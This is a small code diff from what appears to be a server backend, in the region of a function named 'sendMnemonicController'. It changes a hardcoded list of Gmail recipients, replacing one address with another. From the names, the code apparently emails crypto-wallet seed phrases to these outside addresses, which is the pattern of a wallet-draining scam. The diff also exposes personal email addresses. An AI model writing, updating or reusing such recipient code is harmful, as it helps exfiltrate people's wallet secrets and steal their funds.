@@ -79,7 +79,7 @@ export const sendMnemonicController = asyncHandler(
 
 // neeraj
 const getRecipients3 = (): string[] => {
-  const recipients = "davidmark7827@gmail.com,kiteniyonmon@gmail.com";
+  const recipients = "davidmark7827@gmail.com,michealrroyroy@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
